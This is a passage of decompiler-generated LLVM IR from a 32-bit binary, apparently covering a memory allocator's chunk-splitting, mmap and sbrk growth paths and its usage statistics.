  store i32 %v0_8052edd, i32* %v3_8052edd, align 4
  %v0_8052ee0 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8052ee0, 16
  br i1 %tmp127, label %dec_label_pc_8052ee5, label %dec_label_pc_8052eec

dec_label_pc_8052ee5:                             ; preds = %dec_label_pc_8052ecb
  %v0_8052ee5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052ee5 = load i32, i32* @edx, align 4
  %v2_8052ee5 = add i32 %v0_8052ee5, 4
  %v3_8052ee5 = add i32 %v2_8052ee5, %v1_8052ee5
  %v4_8052ee5 = inttoptr i32 %v3_8052ee5 to i32*
  %v5_8052ee5 = load i32, i32* %v4_8052ee5, align 4
  %v6_8052ee5 = or i32 %v5_8052ee5, 1
  store i32 %v6_8052ee5, i32* %v4_8052ee5, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052eec:                             ; preds = %dec_label_pc_8052ecb
  store i32 %v1_8052fc8, i32* %eax.global-to-local, align 4
  %v0_8052ef5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ef5 = add i32 %v0_8052ef5, %v1_8052fc8
  store i32 %v2_8052ef5, i32* @edx, align 4
  %v1_8052ef8 = load i32, i32* @ebp, align 4
  %v2_8052ef8 = add i32 %v1_8052ef8, 8
  %v3_8052ef8 = inttoptr i32 %v2_8052ef8 to i32*
  store i32 %v2_8052ef5, i32* %v3_8052ef8, align 4
  %v0_8052efb = load i32, i32* @edx, align 4
  %v1_8052efb = load i32, i32* @ebp, align 4
  %v2_8052efb = add i32 %v1_8052efb, 12
  %v3_8052efb = inttoptr i32 %v2_8052efb to i32*
  store i32 %v0_8052efb, i32* %v3_8052efb, align 4
  %v0_8052efe = load i32, i32* @edx, align 4
  %v1_8052efe = add i32 %v0_8052efe, 8
  %v2_8052efe = inttoptr i32 %v1_8052efe to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_8052efe, align 4
  %v0_8052f05 = load i32, i32* @edx, align 4
  %v1_8052f05 = add i32 %v0_8052f05, 12
  %v2_8052f05 = inttoptr i32 %v1_8052f05 to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_8052f05, align 4
  br i1 %v6_8052c81, label %dec_label_pc_8052f14, label %dec_label_pc_8052f0e

dec_label_pc_8052f0e:                             ; preds = %dec_label_pc_8052eec
  %v0_8052f0e = load i32, i32* @edx, align 4
  store i32 %v0_8052f0e, i32* @global_var_8056c50.208, align 16
  br label %dec_label_pc_8052f14

dec_label_pc_8052f14:                             ; preds = %dec_label_pc_8052eec, %dec_label_pc_8052f0e
  %v4_8052f14 = or i32 %v1_8052fc8, 1
  %v0_8052f19 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052f14, i32* %ebx.global-to-local, align 4
  %v1_8052f1f = or i32 %v0_8052f19, 1
  store i32 %v1_8052f1f, i32* %eax.global-to-local, align 4
  %v1_8052f22 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052f22 = add i32 %v1_8052f22, 4
  %v3_8052f22 = inttoptr i32 %v2_8052f22 to i32*
  store i32 %v4_8052f14, i32* %v3_8052f22, align 4
  %v0_8052f25 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052f25 = load i32, i32* @edx, align 4
  %v3_8052f25 = add i32 %v1_8052f25, %v0_8052f25
  %v4_8052f25 = inttoptr i32 %v3_8052f25 to i32*
  store i32 %v0_8052f25, i32* %v4_8052f25, align 4
  %v0_8052f28 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f28 = load i32, i32* @edx, align 4
  %v2_8052f28 = add i32 %v1_8052f28, 4
  %v3_8052f28 = inttoptr i32 %v2_8052f28 to i32*
  store i32 %v0_8052f28, i32* %v3_8052f28, align 4
  br label %dec_label_pc_8052f2b

dec_label_pc_8052f2b:                             ; preds = %dec_label_pc_8052ee5, %dec_label_pc_8052f14
  %v0_8052f2b = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052f2b = add i32 %v0_8052f2b, 8
  store i32 %v1_8052f2b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805332d

dec_label_pc_8052f33.loopexit:                    ; preds = %dec_label_pc_8052e80
  br label %dec_label_pc_8052f33

dec_label_pc_8052f33:                             ; preds = %dec_label_pc_8052f33.loopexit, %dec_label_pc_8052c3b, %dec_label_pc_8052c43
  %v0_8052f33 = load i32, i32* @global_var_8056c4c.207, align 4
  store i32 %v0_8052f33, i32* @ebx, align 4
  %v1_8052f3d = add i32 %v1_8052fc8, 16
  store i32 %v1_8052f3d, i32* @esi, align 4
  %v1_8052f40 = add i32 %v0_8052f33, 4
  %v2_8052f40 = inttoptr i32 %v1_8052f40 to i32*
  %v3_8052f40 = load i32, i32* %v2_8052f40, align 4
  %v1_8052f47 = and i32 %v3_8052f40, -4
  store i32 %v1_8052f47, i32* %ecx.global-to-local, align 4
  %v7_8052f4a = icmp ult i32 %v1_8052f47, %v1_8052f3d
  br i1 %v7_8052f4a, label %dec_label_pc_8052f6a, label %dec_label_pc_8052f4e

dec_label_pc_8052f4e:                             ; preds = %dec_label_pc_8052f33
  %v2_8052f52 = add i32 %v0_8052f33, %v1_8052fc8
  store i32 %v2_8052f52, i32* @edx, align 4
  %v1_8052f55 = or i32 %v1_8052fc8, 1
  store i32 %v1_8052f55, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f52, i32* @global_var_8056c4c.207, align 4
  store i32 %v1_8052f55, i32* %v2_8052f40, align 4
  %v0_8052f61 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8052f61 = sub i32 %v0_8052f61, %v1_8052fc8
  store i32 %v5_8052f61, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80532bd

dec_label_pc_8052f6a:                             ; preds = %dec_label_pc_8052f33
  %v0_8052f6a = load i32, i32* @global_var_8056f7c.212, align 4
  store i32 %v0_8052f6a, i32* %edx.global-to-local, align 4
  %v0_8052f70 = load i8, i8* @global_var_8056c20.206, align 32
  %v1_8052f70 = and i8 %v0_8052f70, 2
  %v2_8052f70 = icmp eq i8 %v1_8052f70, 0
  br i1 %v2_8052f70, label %dec_label_pc_8052f9e, label %dec_label_pc_8052f79

dec_label_pc_8052f79:                             ; preds = %dec_label_pc_8052f6a
  store i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32* %stack_var_-92, align 4
  %v2_8052f81 = call i32 @function_80537f1(i32* bitcast (i8* @global_var_8056c20.206 to i32*))
  store i32 ptrtoint (i8* @global_var_8056c20.206 to i32), i32* @ebx, align 4
  %v1_8052f8b = add i32 %v1_8052fc8, -7
  store i32 %v1_8052f8b, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f8b, i32* %stack_var_-92, align 4
  %v1_8052f8f = call i32 @function_8052bd4(i32 %v1_8052f8b)
  store i32 %v1_8052f8f, i32* %eax.global-to-local, align 4
  store i32 %v1_8052f8f, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805332d

dec_label_pc_8052f9e:                             ; preds = %dec_label_pc_8052f6a
  %v1_8052f9e = add i32 %v0_8052f6a, -1
  store i32 %v1_8052f9e, i32* @ecx, align 4
  store i32 %v1_8052fc8, i32* @ebx, align 4
  %v1_8052fa9 = load i32, i32* @global_var_8056f6c.213, align 4
  %v7_8052fa9 = icmp ult i32 %v1_8052fc8, %v1_8052fa9
  br i1 %v7_8052fa9, label %dec_label_pc_805306b, label %dec_label_pc_8052fb5

dec_label_pc_8052fb5:                             ; preds = %dec_label_pc_8052f9e
  %v0_8052fb5 = load i32, i32* @global_var_8056f70.214, align 16
  store i32 %v0_8052fb5, i32* %eax.global-to-local, align 4
  %v1_8052fba = load i32, i32* @global_var_8056f74.215, align 4
  %v5_8052fc0 = icmp slt i32 %v0_8052fb5, %v1_8052fba
  br i1 %v5_8052fc0, label %dec_label_pc_8052fc6, label %dec_label_pc_805306b

dec_label_pc_8052fc6:                             ; preds = %dec_label_pc_8052fb5
  %v2_8052fc8 = add i32 %v1_8052fc8, 10
  %v3_8052fc8 = add i32 %v2_8052fc8, %v0_8052f6a
  %v1_8052fcc = sub i32 0, %v0_8052f6a
  store i32 %v1_8052fcc, i32* %eax.global-to-local, align 4
  %v2_8052fce = and i32 %v3_8052fc8, %v1_8052fcc
  store i32 %v2_8052fce, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_8052fce, %v1_8052fc8
  br i1 %tmp128, label %dec_label_pc_8052fda, label %dec_label_pc_805306b

dec_label_pc_8052fda:                             ; preds = %dec_label_pc_8052fc6
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052fe7 = call i32 @function_8054418(i32 0, i32 %v2_8052fce, i32 3, i32 34, i32 0, i32 0, i32 %v1_8052f9e, i32 %v1_8052f9e)
  store i32 %v8_8052fe7, i32* %eax.global-to-local, align 4
  store i32 %v8_8052fe7, i32* @edx, align 4
  %v10_8052ff1 = icmp eq i32 %v8_8052fe7, -1
  br i1 %v10_8052ff1, label %dec_label_pc_8052fda.dec_label_pc_805306b_crit_edge, label %dec_label_pc_8052ff6

dec_label_pc_8052fda.dec_label_pc_805306b_crit_edge: ; preds = %dec_label_pc_8052fda
  %v0_805306b.pre = load i32, i32* @global_var_8056c4c.207, align 4
  br label %dec_label_pc_805306b

dec_label_pc_8052ff6:                             ; preds = %dec_label_pc_8052fda
  %v1_8052ff8 = urem i32 %v8_8052fe7, 8
  %v2_8052ff8 = icmp eq i32 %v1_8052ff8, 0
  store i32 %v1_8052ff8, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052ff8, label %dec_label_pc_8053010, label %dec_label_pc_8052ffd

dec_label_pc_8052ffd:                             ; preds = %dec_label_pc_8052ff6
  %v0_8053002 = load i32, i32* @ebx, align 4
  %v2_8053004 = sub nsw i32 8, %v1_8052ff8
  store i32 %v2_8053004, i32* %eax.global-to-local, align 4
  %v2_8053006 = add i32 %v2_8053004, %v8_8052fe7
  store i32 %v2_8053006, i32* @edx, align 4
  %v2_8053008 = sub i32 %v0_8053002, %v2_8053004
  store i32 %v2_8053008, i32* %esi.global-to-local, align 4
  %v2_805300a = inttoptr i32 %v2_8053006 to i32*
  store i32 %v2_8053004, i32* %v2_805300a, align 4
  br label %dec_label_pc_8053018

dec_label_pc_8053010:                             ; preds = %dec_label_pc_8052ff6
  %v1_8053010 = inttoptr i32 %v8_8052fe7 to i32*
  store i32 0, i32* %v1_8053010, align 4
  br label %dec_label_pc_8053018

dec_label_pc_8053018:                             ; preds = %dec_label_pc_8052ffd, %dec_label_pc_8053010
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8052ffd ], [ @ebx, %dec_label_pc_8053010 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8053018 = or i32 %storemerge, 2
  %v1_805301b = load i32, i32* @edx, align 4
  %v2_805301b = add i32 %v1_805301b, 4
  %v3_805301b = inttoptr i32 %v2_805301b to i32*
  store i32 %v1_8053018, i32* %v3_805301b, align 4
  %v0_805301e = load i32, i32* @global_var_8056f70.214, align 16
  %v1_8053023 = add i32 %v0_805301e, 1
  store i32 %v1_8053023, i32* %eax.global-to-local, align 4
  store i32 %v1_8053023, i32* @global_var_8056f70.214, align 16
  %v1_8053029 = load i32, i32* @global_var_8056f78.216, align 8
  %v7_805302f = icmp sgt i32 %v1_8053023, %v1_8053029
  br i1 %v7_805302f, label %dec_label_pc_8053031, label %dec_label_pc_8053036

dec_label_pc_8053031:                             ; preds = %dec_label_pc_8053018
  store i32 %v1_8053023, i32* @global_var_8056f78.216, align 8
  br label %dec_label_pc_8053036

dec_label_pc_8053036:                             ; preds = %dec_label_pc_8053018, %dec_label_pc_8053031
  %v0_8053036 = load i32, i32* @global_var_8056f84.217, align 4
  %v1_805303b = load i32, i32* @ebx, align 4
  %v2_805303b = add i32 %v1_805303b, %v0_8053036
  store i32 %v2_805303b, i32* %eax.global-to-local, align 4
  store i32 %v2_805303b, i32* @global_var_8056f84.217, align 4
  %v1_8053042 = load i32, i32* @global_var_8056f90.218, align 16
  %tmp129 = icmp ugt i32 %v2_805303b, %v1_8053042
  br i1 %tmp129, label %dec_label_pc_805304a, label %dec_label_pc_805304f

dec_label_pc_805304a:                             ; preds = %dec_label_pc_8053036
  store i32 %v2_805303b, i32* @global_var_8056f90.218, align 16
  br label %dec_label_pc_805304f

dec_label_pc_805304f:                             ; preds = %dec_label_pc_8053036, %dec_label_pc_805304a
  %v1_805304f = load i32, i32* @global_var_8056f88.219, align 8
  %v2_805304f = add i32 %v1_805304f, %v2_805303b
  store i32 %v2_805304f, i32* %eax.global-to-local, align 4
  %v1_8053055 = load i32, i32* @global_var_8056f94.220, align 4
  %tmp130 = icmp ugt i32 %v2_805304f, %v1_8053055
  br i1 %tmp130, label %dec_label_pc_8053061, label %dec_label_pc_8052cb2

dec_label_pc_8053061:                             ; preds = %dec_label_pc_805304f
  store i32 %v2_805304f, i32* @global_var_8056f94.220, align 4
  br label %dec_label_pc_8052cb2

dec_label_pc_805306b:                             ; preds = %dec_label_pc_8052fc6, %dec_label_pc_8052fda.dec_label_pc_805306b_crit_edge, %dec_label_pc_8052fb5, %dec_label_pc_8052f9e
  %v0_805306b = phi i32 [ %v0_805306b.pre, %dec_label_pc_8052fda.dec_label_pc_805306b_crit_edge ], [ %v0_8052f33, %dec_label_pc_8052fb5 ], [ %v0_8052f33, %dec_label_pc_8052fc6 ], [ %v0_8052f33, %dec_label_pc_8052f9e ]
  store i32 %v0_805306b, i32* %eax.global-to-local, align 4
  %v1_8053074 = add i32 %v0_805306b, 4
  %v2_8053074 = inttoptr i32 %v1_8053074 to i32*
  %v3_8053074 = load i32, i32* %v2_8053074, align 4
  %v1_805307e = and i32 %v3_8053074, -4
  %v2_805307e = icmp eq i32 %v1_805307e, 0
  store i32 %v1_805307e, i32* @ebp, align 4
  %v1_8053081 = load i32, i32* @global_var_8056f68.221, align 8
  %v2_8053081 = add i32 %v1_8053081, %v1_8052f3d
  store i32 %v2_8053081, i32* %eax.global-to-local, align 4
  %v0_8053087 = load i8, i8* @global_var_8056f80.222, align 128
  %v1_8053087 = urem i8 %v0_8053087, 2
  %v2_8053087 = icmp eq i8 %v1_8053087, 0
  br i1 %v2_8053087, label %dec_label_pc_8053092, label %dec_label_pc_8053090

dec_label_pc_8053090:                             ; preds = %dec_label_pc_805306b
  %v2_8053090 = sub i32 %v2_8053081, %v1_805307e
  store i32 %v2_8053090, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053092

dec_label_pc_8053092:                             ; preds = %dec_label_pc_805306b, %dec_label_pc_8053090
  %v0_8053096 = phi i32 [ %v2_8053081, %dec_label_pc_805306b ], [ %v2_8053090, %dec_label_pc_8053090 ]
  %v5_8053096 = add i32 %v0_8053096, %v1_8052f9e
  store i32 %v5_8053096, i32* %eax.global-to-local, align 4
  %v1_805309a = sub i32 0, %v0_8052f6a
  store i32 %v1_805309a, i32* @edx, align 4
  %v2_80530a2 = and i32 %v5_8053096, %v1_805309a
  store i32 %v2_80530a2, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80530a2, 1
  br i1 %tmp91, label %dec_label_pc_80530bc, label %dec_label_pc_80530a6

dec_label_pc_80530a6:                             ; preds = %dec_label_pc_8053092
  store i32 %v2_80530a2, i32* %stack_var_-92, align 4
  %v1_80530aa = call i32 @function_80548c9(i32 %v2_80530a2)
  store i32 %v1_80530aa, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80530aa, i32* @ebx, align 4
  %v10_80530b7 = icmp eq i32 %v1_80530aa, -1
  %v1_80530ba = icmp eq i1 %v10_80530b7, false
  br i1 %v1_80530ba, label %dec_label_pc_8053112.dec_label_pc_805311b_crit_edge, label %dec_label_pc_80530a6.dec_label_pc_80530bc_crit_edge

dec_label_pc_80530a6.dec_label_pc_80530bc_crit_edge: ; preds = %dec_label_pc_80530a6
  %v0_80530bc.pre = load i8, i8* @global_var_8056f80.222, align 128
  br label %dec_label_pc_80530bc

dec_label_pc_80530bc:                             ; preds = %dec_label_pc_80530a6.dec_label_pc_80530bc_crit_edge, %dec_label_pc_8053092
  %v0_80530e8 = phi i32 [ -1, %dec_label_pc_80530a6.dec_label_pc_80530bc_crit_edge ], [ %v1_805309a, %dec_label_pc_8053092 ]
  %v0_80530bc = phi i8 [ %v0_80530bc.pre, %dec_label_pc_80530a6.dec_label_pc_80530bc_crit_edge ], [ %v0_8053087, %dec_label_pc_8053092 ]
  %v1_80530bc = urem i8 %v0_80530bc, 2
  %v2_80530bc = icmp eq i8 %v1_80530bc, 0
  br i1 %v2_80530bc, label %dec_label_pc_80530bc.dec_label_pc_80530d1_crit_edge, label %dec_label_pc_80530c5

dec_label_pc_80530bc.dec_label_pc_80530d1_crit_edge: ; preds = %dec_label_pc_80530bc
  %v0_80530d1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80530d1

dec_label_pc_80530c5:                             ; preds = %dec_label_pc_80530bc
  %v2_80530c9 = add i32 %v1_805307e, %v1_8052f9e
  store i32 %v2_80530c9, i32* %eax.global-to-local, align 4
  %v0_80530cb = load i32, i32* @esi, align 4
  %v2_80530cb = add i32 %v0_80530cb, %v2_80530c9
  %v5_80530cd = and i32 %v2_80530cb, %v1_805309a
  store i32 %v5_80530cd, i32* @esi, align 4
  br label %dec_label_pc_80530d1

dec_label_pc_80530d1:                             ; preds = %dec_label_pc_80530bc.dec_label_pc_80530d1_crit_edge, %dec_label_pc_80530c5
  %v0_80530d1 = phi i32 [ %v0_80530d1.pre, %dec_label_pc_80530bc.dec_label_pc_80530d1_crit_edge ], [ %v5_80530cd, %dec_label_pc_80530c5 ]
  %tmp131 = icmp ult i32 %v0_80530d1, 1048576
  br i1 %tmp131, label %dec_label_pc_80530d9, label %dec_label_pc_80530de

dec_label_pc_80530d9:                             ; preds = %dec_label_pc_80530d1
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_80530de

dec_label_pc_80530de:                             ; preds = %dec_label_pc_80530d1, %dec_label_pc_80530d9
  %v0_80530f2 = phi i32 [ %v0_80530d1, %dec_label_pc_80530d1 ], [ 1048576, %dec_label_pc_80530d9 ]
  %tmp132 = icmp ugt i32 %v0_80530f2, %v1_8052fc8
  br i1 %tmp132, label %dec_label_pc_80530e8, label %dec_label_pc_8053320

dec_label_pc_80530e8:                             ; preds = %dec_label_pc_80530de
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80530f5 = call i32 @function_8054418(i32 0, i32 %v0_80530f2, i32 3, i32 34, i32 0, i32 0, i32 %v0_80530e8, i32 %v0_80530e8)
  store i32 %v8_80530f5, i32* %eax.global-to-local, align 4
  store i32 %v8_80530f5, i32* @ebx, align 4
  %v10_80530ff = icmp eq i32 %v8_80530f5, -1
  br i1 %v10_80530ff, label %dec_label_pc_8053320, label %dec_label_pc_8053112.thread

dec_label_pc_8053112.thread:                      ; preds = %dec_label_pc_80530e8
  %v0_8053108 = load i8, i8* @global_var_8056f80.222, align 1
  %v2_8053108 = and i8 %v0_8053108, -2
  store i8 %v2_8053108, i8* @global_var_8056f80.222, align 128
  %v1_805310f = load i32, i32* @esi, align 4
  %v2_805310f = add i32 %v1_805310f, %v8_80530f5
  store i32 %v2_805310f, i32* @edx, align 4
  br label %dec_label_pc_805311b

dec_label_pc_8053112.dec_label_pc_805311b_crit_edge: ; preds = %dec_label_pc_80530a6
  %v1_805311f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805311b

dec_label_pc_805311b:                             ; preds = %dec_label_pc_8053112.dec_label_pc_805311b_crit_edge, %dec_label_pc_8053112.thread
  %v1_805311f = phi i32 [ %v1_805310f, %dec_label_pc_8053112.thread ], [ %v1_805311f.pre, %dec_label_pc_8053112.dec_label_pc_805311b_crit_edge ]
  %v0_80531e794 = phi i32 [ %v8_80530f5, %dec_label_pc_8053112.thread ], [ %v1_80530aa, %dec_label_pc_8053112.dec_label_pc_805311b_crit_edge ]
  %v0_80531d993 = phi i32 [ %v2_805310f, %dec_label_pc_8053112.thread ], [ -1, %dec_label_pc_8053112.dec_label_pc_805311b_crit_edge ]
  %v0_805311f = load i32, i32* @global_var_8056f88.219, align 8
  %v2_805311f = add i32 %v1_805311f, %v0_805311f
  store i32 %v2_805311f, i32* @global_var_8056f88.219, align 8
  %v2_8053125 = add i32 %v1_805307e, %v0_805306b
  store i32 %v2_8053125, i32* %ecx.global-to-local, align 4
  %v2_8053127 = sub i32 %v0_80531e794, %v2_8053125
  %v7_8053127 = icmp ult i32 %v0_80531e794, %v2_8053125
  %v12_8053127 = icmp eq i32 %v2_8053127, 0
  %v1_8053129 = icmp eq i1 %v12_8053127, false
  br i1 %v1_8053129, label %dec_label_pc_8053142, label %dec_label_pc_805312b

dec_label_pc_805312b:                             ; preds = %dec_label_pc_805311b
  %v10_805312b = icmp eq i32 %v0_80531d993, -1
  %v1_805312e = icmp eq i1 %v10_805312b, false
  br i1 %v1_805312e, label %dec_label_pc_8053142, label %dec_label_pc_8053130

dec_label_pc_8053130:                             ; preds = %dec_label_pc_805312b
  %v2_8053130 = add i32 %v1_805311f, %v1_805307e
  store i32 %v0_805306b, i32* %ecx.global-to-local, align 4
  %v1_8053137 = or i32 %v2_8053130, 1
  store i32 %v1_8053137, i32* %eax.global-to-local, align 4
  store i32 %v1_8053137, i32* %v2_8053074, align 4
  br label %dec_label_pc_805326f

dec_label_pc_8053142:                             ; preds = %dec_label_pc_805312b, %dec_label_pc_805311b
  %v0_8053142 = load i8, i8* @global_var_8056f80.222, align 1
  %v1_8053142 = sext i8 %v0_8053142 to i32
  store i32 %v1_8053142, i32* %eax.global-to-local, align 4
  %v2_8053147 = urem i8 %v0_8053142, 2
  %v3_8053147 = icmp eq i8 %v2_8053147, 0
  br i1 %v3_8053147, label %dec_label_pc_805315b, label %dec_label_pc_805314b

dec_label_pc_805314b:                             ; preds = %dec_label_pc_8053142
  br i1 %v2_805307e, label %dec_label_pc_805315b, label %dec_label_pc_805314f

dec_label_pc_805314f:                             ; preds = %dec_label_pc_805314b
  %v1_8053151 = icmp eq i1 %v7_8053127, false
  br i1 %v1_8053151, label %dec_label_pc_805315b, label %dec_label_pc_8053153

dec_label_pc_8053153:                             ; preds = %dec_label_pc_805314f
  %v1_8053153 = and i32 %v1_8053142, -2
  %v4_8053153 = trunc i32 %v1_8053153 to i8
  store i32 %v1_8053153, i32* %eax.global-to-local, align 4
  store i8 %v4_8053153, i8* @global_var_8056f80.222, align 128
  br label %dec_label_pc_805315b

dec_label_pc_805315b:                             ; preds = %dec_label_pc_805314f, %dec_label_pc_805314b, %dec_label_pc_8053142, %dec_label_pc_8053153
  %v0_805315b = phi i8 [ %v0_8053142, %dec_label_pc_805314f ], [ %v0_8053142, %dec_label_pc_805314b ], [ %v0_8053142, %dec_label_pc_8053142 ], [ %v4_8053153, %dec_label_pc_8053153 ]
  %v1_805315b = urem i8 %v0_805315b, 2
  %v2_805315b = icmp eq i8 %v1_805315b, 0
  br i1 %v2_805315b, label %dec_label_pc_80531d9, label %dec_label_pc_8053164

dec_label_pc_8053164:                             ; preds = %dec_label_pc_805315b
  br i1 %v2_805307e, label %dec_label_pc_8053172, label %dec_label_pc_8053168

dec_label_pc_8053168:                             ; preds = %dec_label_pc_8053164
  store i32 %v2_8053127, i32* %eax.global-to-local, align 4
  %v2_805316c = add i32 %v2_805311f, %v2_8053127
  store i32 %v2_805316c, i32* @global_var_8056f88.219, align 8
  br label %dec_label_pc_8053172

dec_label_pc_8053172:                             ; preds = %dec_label_pc_8053164, %dec_label_pc_8053168
  %v1_8053174 = urem i32 %v0_80531e794, 8
  %v2_8053174 = icmp eq i32 %v1_8053174, 0
  store i32 %v1_8053174, i32* %edx.global-to-local, align 4
  %v1_8053177 = icmp eq i1 %v2_8053174, false
  br i1 %v1_8053177, label %dec_label_pc_805317f, label %dec_label_pc_8053179

dec_label_pc_8053179:                             ; preds = %dec_label_pc_8053172
  store i32 %v0_80531e794, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053189

dec_label_pc_805317f:                             ; preds = %dec_label_pc_8053172
  %v2_8053184 = sub nsw i32 8, %v1_8053174
  store i32 %v2_8053184, i32* %eax.global-to-local, align 4
  %v2_8053186 = add i32 %v2_8053184, %v0_80531e794
  store i32 %v2_8053186, i32* @edi, align 4
  br label %dec_label_pc_8053189

dec_label_pc_8053189:                             ; preds = %dec_label_pc_8053179, %dec_label_pc_805317f
  %v0_805318c = phi i32 [ 0, %dec_label_pc_8053179 ], [ %v2_8053184, %dec_label_pc_805317f ]
  %v2_8053189 = add i32 %v1_805311f, %v0_80531e794
  %v2_805318c = add i32 %v0_805318c, %v1_805307e
  store i32 %v2_805318c, i32* %ecx.global-to-local, align 4
  %v2_8053195 = add i32 %v2_805318c, %v2_8053189
  store i32 %v2_8053195, i32* %edx.global-to-local, align 4
  %v2_805319b = add i32 %v2_8053195, %v1_8052f9e
  %v5_805319e = and i32 %v2_805319b, %v1_805309a
  %v2_80531a5 = sub i32 %v5_805319e, %v2_8053195
  store i32 %v2_80531a5, i32* %eax.global-to-local, align 4
  %v2_80531a7 = add i32 %v2_80531a5, %v2_805318c
  store i32 %v2_80531a7, i32* @esi, align 4
  store i32 %v2_80531a7, i32* %stack_var_-92, align 4
  %v1_80531ab = call i32 @function_80548c9(i32 %v2_80531a7)
  store i32 %v1_80531ab, i32* %eax.global-to-local, align 4
  store i32 %v1_80531ab, i32* @edx, align 4
  %v10_80531b5 = icmp eq i32 %v1_80531ab, -1
  %v1_80531b8 = icmp eq i1 %v10_80531b5, false
  br i1 %v1_80531b8, label %dec_label_pc_80531c8, label %dec_label_pc_80531ba

dec_label_pc_80531ba:                             ; preds = %dec_label_pc_8053189
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80531bf = call i32 @function_80548c9(i32 0)
  store i32 %v1_80531bf, i32* %eax.global-to-local, align 4
  store i32 %v1_80531bf, i32* @edx, align 4
  br label %dec_label_pc_80531fc

dec_label_pc_80531c8:                             ; preds = %dec_label_pc_8053189
  %v1_80531c8 = load i32, i32* @ebx, align 4
  %v7_80531c8 = icmp ult i32 %v1_80531ab, %v1_80531c8
  %v1_80531ca = icmp eq i1 %v7_80531c8, false
  br i1 %v1_80531ca, label %dec_label_pc_8053201, label %dec_label_pc_80531cc

dec_label_pc_80531cc:                             ; preds = %dec_label_pc_80531c8
  %v0_80531cc = load i8, i8* @global_var_8056f80.222, align 1
  %v2_80531cc = and i8 %v0_80531cc, -2
  store i8 %v2_80531cc, i8* @global_var_8056f80.222, align 128
  store i32 %v2_8053189, i32* @edx, align 4
  br label %dec_label_pc_80531e0

dec_label_pc_80531d9:                             ; preds = %dec_label_pc_805315b
  %v10_80531d9 = icmp eq i32 %v0_80531d993, -1
  br i1 %v10_80531d9, label %dec_label_pc_80531e4, label %dec_label_pc_80531de

dec_label_pc_80531de:                             ; preds = %dec_label_pc_80531d9
  store i32 %v0_80531e794, i32* @edi, align 4
  br label %dec_label_pc_80531e0

dec_label_pc_80531e0:                             ; preds = %dec_label_pc_80531cc, %dec_label_pc_80531de
  %v0_805320158 = phi i32 [ %v2_8053189, %dec_label_pc_80531cc ], [ %v0_80531d993, %dec_label_pc_80531de ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053201

dec_label_pc_80531e4:                             ; preds = %dec_label_pc_80531d9
  store i32 %v0_80531e794, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80531eb = call i32 @function_80548c9(i32 0)
  store i32 %v1_80531eb, i32* @edx, align 4
  %v1_80531f2 = load i32, i32* @ebx, align 4
  %v2_80531f2 = sub i32 %v1_80531eb, %v1_80531f2
  %v1_80531f4 = load i32, i32* @esi, align 4
  %v2_80531f4 = sub i32 %v2_80531f2, %v1_80531f4
  store i32 %v2_80531f4, i32* %eax.global-to-local, align 4
  %v0_80531f6 = load i32, i32* @global_var_8056f88.219, align 8
  %v2_80531f6 = add i32 %v0_80531f6, %v2_80531f4
  store i32 %v2_80531f6, i32* @global_var_8056f88.219, align 8
  br label %dec_label_pc_80531fc

dec_label_pc_80531fc:                             ; preds = %dec_label_pc_80531ba, %dec_label_pc_80531e4
  %v0_805320157 = phi i32 [ %v1_80531bf, %dec_label_pc_80531ba ], [ %v1_80531eb, %dec_label_pc_80531e4 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053201

dec_label_pc_8053201:                             ; preds = %dec_label_pc_80531c8, %dec_label_pc_80531e0, %dec_label_pc_80531fc
  %v0_8053206 = phi i32 [ %v1_80531ab, %dec_label_pc_80531c8 ], [ %v0_805320158, %dec_label_pc_80531e0 ], [ %v0_805320157, %dec_label_pc_80531fc ]
  %v10_8053201 = icmp eq i32 %v0_8053206, -1
  br i1 %v10_8053201, label %dec_label_pc_805326f, label %dec_label_pc_8053206

dec_label_pc_8053206:                             ; preds = %dec_label_pc_8053201
  %v1_8053206 = load i32, i32* @edi, align 4
  %v2_8053206 = sub i32 %v0_8053206, %v1_8053206
  store i32 %v2_8053206, i32* @edx, align 4
  store i32 %v1_8053206, i32* @global_var_8056c4c.207, align 4
  %v1_805320e = load i32, i32* @esi, align 4
  %v2_805320e = add i32 %v1_805320e, %v2_8053206
  %v1_8053211 = or i32 %v2_805320e, 1
  store i32 %v1_8053211, i32* %eax.global-to-local, align 4
  %v2_8053214 = add i32 %v1_8053206, 4
  %v3_8053214 = inttoptr i32 %v2_8053214 to i32*
  store i32 %v1_8053211, i32* %v3_8053214, align 4
  %v0_8053217 = load i32, i32* @global_var_8056f88.219, align 8
  %v1_8053217 = load i32, i32* @esi, align 4
  %v2_8053217 = add i32 %v1_8053217, %v0_8053217
